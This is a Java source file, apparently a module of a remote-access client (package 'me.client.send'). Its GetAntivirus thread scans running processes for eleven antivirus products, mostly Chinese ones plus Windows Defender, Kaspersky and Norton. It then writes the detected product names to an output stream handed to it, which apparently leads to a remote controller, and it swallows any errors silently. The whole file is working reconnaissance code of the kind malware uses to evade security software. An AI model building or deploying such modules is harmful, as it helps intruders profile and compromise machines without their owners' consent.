package me.client.send;

import oshi.SystemInfo;
import oshi.hardware.HardwareAbstractionLayer;
import oshi.software.os.OSProcess;
import oshi.software.os.OperatingSystem;
import oshi.util.FormatUtil;

import java.io.DataOutputStream;
import java.io.OutputStreamWriter;
import java.net.Socket;
import java.util.List;

public class GetAntivirus extends Thread{
    DataOutputStream dataOutputStream;
    public GetAntivirus(DataOutputStream dataOutputStream){
        this.dataOutputStream = dataOutputStream;
    }
    @Override
    public void run() {
        SystemInfo systemInfo = new SystemInfo();
        OperatingSystem os = systemInfo.getOperatingSystem();
        List<OSProcess> list = os.getProcesses();
        String s = "";
        String exe = " ";
        try {
            for (OSProcess osProcess : list) {
                s = osProcess.getName();
                if (s.contains("360tray")) {
                    exe += "360安全卫士|";
                } else if (s.contains("360sd")) {
                    exe += "360杀毒|";
                } else if (s.contains("MsMpEng")) {
                    exe += "Windows Defender|";
                } else if (s.contains("wsctrl")) {
                    exe += "火绒|";
                } else if (s.contains("ksafe")) {
                    exe += "金山卫士|";
                } else if (s.contains("QQPCRTP")) {
                    exe += "电脑管家|";
                } else if (s.contains("kxetray")) {
                    exe += "金山毒霸|";
                } else if (s.contains("RavMonD")) {
                    exe += "瑞星|";
                } else if (s.contains("avp")) {
                    exe += "卡巴斯基|";
                } else if (s.contains("avcenter")) {
                    exe += "小红伞|";
                } else if (s.contains("rtvscan")) {
                    exe += "诺顿|";
                }
            }
            dataOutputStream.writeUTF(exe);
            dataOutputStream.flush();
        }catch (Exception e) {
        }
    }
}
